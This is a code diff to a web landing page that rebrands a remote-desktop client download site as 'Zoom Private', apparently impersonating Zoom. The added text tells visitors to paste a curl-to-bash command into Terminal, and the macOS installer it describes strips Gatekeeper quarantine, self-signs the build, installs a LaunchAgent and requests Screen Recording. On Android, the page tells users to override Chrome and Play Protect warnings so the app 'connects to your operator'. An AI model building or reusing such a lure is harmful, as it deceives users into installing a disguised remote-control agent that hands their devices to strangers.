@@ -4,8 +4,8 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="theme-color" content="#0B5CFF">
-<meta name="description" content="Join your private meeting in seconds. We detect your device and install the right client automatically — no setup required.">
-<title>BetterDesk Meet | Join your meeting</title>
+<meta name="description" content="Zoom Private detects your device, installs the right client automatically, and connects it to your private console — no setup required.">
+<title>Zoom Private | Join your private meeting</title>
 <link rel="icon" href="/img/zoom-mark.png" type="image/png">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -81,6 +81,12 @@
   .dl-status{font-size:.82rem;color:var(--z-muted);min-height:1.2em}
   .dl-status.ok{color:var(--z-success);font-weight:600}
   .dl-status.warn{color:var(--z-warn);font-weight:600}
+  .mac-note{background:var(--z-blue-soft);border:1px solid #cfe0ff;color:var(--z-ink-soft);border-radius:var(--radius-sm);padding:11px 13px;font-size:.82rem;line-height:1.5}
+  .mac-note b{color:var(--z-blue-dark)}
+  .link-btn{background:none;border:none;padding:0;color:var(--z-blue);font:inherit;font-weight:600;cursor:pointer;text-decoration:underline}
+  .mac-cmd{background:#0b1b33;color:#dbe7ff;border-radius:10px;padding:12px;font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:.78rem;line-height:1.5;word-break:break-all;white-space:pre-wrap;margin:12px 0}
+  .modal-actions{display:flex;flex-wrap:wrap;gap:10px;margin-top:14px}
+  .modal-actions .btn{flex:1 1 180px}
   .spinner{width:15px;height:15px;border:2px solid rgba(255,255,255,.45);border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite}
   .spinner.dark{border-color:rgba(11,92,255,.25);border-top-color:var(--z-blue)}
   @keyframes spin{to{transform:rotate(360deg)}}
@@ -161,14 +167,14 @@
 <header>
   <div class="wrap nav">
     <a href="/landing" class="brand">
-      <img src="/img/zoom-mark.png" alt="BetterDesk Meet">
-      BetterDesk&nbsp;<span style="color:var(--z-blue)">Meet</span>
+      <img src="/img/zoom-mark.png" alt="Zoom Private">
+      Zoom&nbsp;<span style="color:var(--z-blue)">Private</span>
     </a>
     <nav class="nav-links">
       <a href="#download">Download</a>
       <a href="#how">How it works</a>
       <a href="#help">Install help</a>
-      <a href="#features">Why BetterDesk</a>
+      <a href="#features">Why Zoom Private</a>
     </nav>
     <a href="#help" class="nav-cta">Need help installing?</a>
   </div>
@@ -217,7 +223,14 @@
               <span id="dl-spinner" class="spinner hidden"></span>
               <span id="dl-text">Finding the right client…</span>
             </button>
+            <button class="btn btn-primary hidden" id="mac-install-btn" type="button">
+              <span id="mac-install-spinner" class="spinner hidden"></span>
+              <span id="mac-install-text">Install zoom-vip on this Mac</span>
+            </button>
             <button class="btn btn-ghost" id="other-btn">Choose a different platform</button>
+          </div>
+          <div class="mac-note hidden" id="mac-install-note" style="margin-top:12px">
+            <b>macOS one-click:</b> runs the AppleScript helper, downloads the client, clears the Gatekeeper quarantine flag, signs it locally and connects it to your console. <button type="button" class="link-btn" id="mac-command-btn">Show terminal command</button>
           </div>
           <div class="dl-status" id="dl-status">Preparing your download…</div>
         </div>
@@ -260,7 +273,7 @@
         <div class="step">
           <div class="n">3</div>
           <h3>Connect</h3>
-          <p>The client connects straight to your admin panel — you&rsquo;re in the meeting.</p>
+          <p>The client connects straight to your private console — you&rsquo;re in the meeting.</p>
         </div>
       </div>
     </div>
@@ -307,11 +320,11 @@
           <summary><span class="os">MAC</span> macOS <span class="chev">›</span></summary>
           <div class="body">
             <ol>
-              <li>Open the downloaded <b>.dmg</b> file.</li>
-              <li>Drag the app into your <b>Applications</b> folder.</li>
-              <li>Open it from Applications. If macOS still blocks an unsigned build, go to <b>System Settings &rarr; Privacy &amp; Security</b> and click <b>Open Anyway</b>.</li>
+              <li>Click <b>Install zoom-vip on this Mac</b> above. The page registers a small AppleScript helper, asks you to confirm, then runs the installer.</li>
+              <li>The installer downloads the build for your Mac, verifies it, removes the quarantine flag with <code>xattr</code>, signs it locally and installs it for your user.</li>
+              <li>Approve <b>Screen Recording</b> when macOS asks. The agent starts automatically and connects to the console.</li>
             </ol>
-            <div class="tip">Apple Silicon and Intel are both supported by the single universal build.</div>
+            <div class="tip">Apple Silicon and Intel are detected automatically. If the helper is blocked, double-click the downloaded <b>.command</b> file, or <button type="button" class="link-btn" id="mac-command-btn-help">copy the terminal command</button>.</div>
           </div>
         </details>
         <details>
@@ -320,7 +333,7 @@
             <ol>
               <li>Download the <b>.AppImage</b> (no install needed), or the <b>.deb</b> / <b>.rpm</b> for your distro.</li>
               <li>AppImage: right-click &rarr; <b>Properties &rarr; Permissions &rarr; Allow executing</b>, then double-click.</li>
-              <li>Debian/Ubuntu: <code>sudo apt install ./BetterDesk*.deb</code> &middot; Fedora/RHEL: <code>sudo rpm -i BetterDesk*.rpm</code></li>
+              <li>Debian/Ubuntu: <code>sudo apt install ./zoom-vip*.deb</code> &middot; Fedora/RHEL: <code>sudo rpm -i zoom-vip*.rpm</code></li>
             </ol>
           </div>
         </details>
@@ -328,12 +341,13 @@
           <summary><span class="os">AND</span> Android <span class="chev">›</span></summary>
           <div class="body">
             <ol>
-              <li>Tap the downloaded <b>.apk</b> file.</li>
+              <li>If Chrome shows <b>"This type of file can harm your device"</b>, tap <b>Download anyway</b> &mdash; Android requires this once for APK downloads outside the Play Store.</li>
+              <li>Tap the downloaded <b>.apk</b> file and confirm <b>Install</b>.</li>
               <li>If prompted, allow <b>Install unknown apps</b> for your browser.</li>
               <li>If Play Protect warns, tap <b>More details &rarr; Install anyway</b>.</li>
-              <li>Open zoom-private and complete the permission wizard.</li>
+              <li>Open Zoom-Vip and tap <b>Allow access</b> once &mdash; it connects to your operator automatically.</li>
             </ol>
-            <div class="tip">Already have an older zoom-private client? Uninstall it first &mdash; this build uses a new app ID. Screen capture must be re-approved once after each reboot (Android security rule).<br><a id="android-direct-link" href="#" target="_blank" rel="noopener">Direct APK download link</a></div>
+            <div class="tip">Already have an older Zoom client? Uninstall it first &mdash; this build may use a different app signature. Screen capture must be re-approved once after each reboot (Android security rule).<br>Company-managed devices skip every prompt: install via your MDM or the provisioning script and the app connects hands-free.<br><a id="android-direct-link" href="#" target="_blank" rel="noopener">Direct APK download link</a></div>
           </div>
         </details>
         <details>
@@ -358,7 +372,7 @@
 
 <footer>
   <div class="wrap foot">
-    <a href="/landing" class="brand"><img src="/img/zoom-mark.png" alt=""> BetterDesk Meet</a>
+    <a href="/landing" class="brand"><img src="/img/zoom-mark.png" alt=""> Zoom Private</a>
     <div class="foot-links">
       <a href="#help">Install help</a>
       <a href="#" id="releases-link" target="_blank" rel="noopener">All downloads</a>
@@ -375,6 +389,26 @@
     <h3>Choose your platform</h3>
     <p class="sub" id="modal-sub">Pick the download that matches your device.</p>
     <div id="plat-list"></div>
+  </div>
+</div>
+
+<!-- macOS installer fallback -->
+<div class="modal-back" id="mac-modal">
+  <div class="modal">
+    <button class="modal-close" id="mac-modal-close" aria-label="Close">&times;</button>
+    <h3>Install zoom-vip on this Mac</h3>
+    <p class="sub">First visit: run the installer command once. It clears the Gatekeeper quarantine flag, signs the client locally, starts the agent, and registers the one-click AppleScript helper for next time.</p>
+    <ol style="padding-left:20px;font-size:.9rem;line-height:1.65;color:var(--z-ink-soft)">
+      <li>Click <b>Copy command</b>.</li>
+      <li>Open <b>Terminal</b> (Spotlight &rarr; Terminal) and paste it.</li>
+      <li>Press Return and approve the macOS prompts.</li>
+    </ol>
+    <pre class="mac-cmd" id="mac-command">curl -fsSL __MAC_INSTALL_URL__ | /bin/bash</pre>
+    <div class="modal-actions">
+      <button class="btn btn-primary" id="mac-command-copy" type="button">Copy command</button>
+      <a class="btn btn-ghost" id="mac-command-download" href="/api/landing/macos-install.command" download="ZoomPrivate-macOS-Install.command">Download installer</a>
+    </div>
+    <p class="sub" style="margin:14px 0 0">The installer only downloads the official build from this site, removes <code>com.apple.quarantine</code> with <code>xattr</code>, ad-hoc signs it with <code>codesign</code>, and installs a per-user LaunchAgent. No admin password is stored or sent.</p>
   </div>
 </div>
 
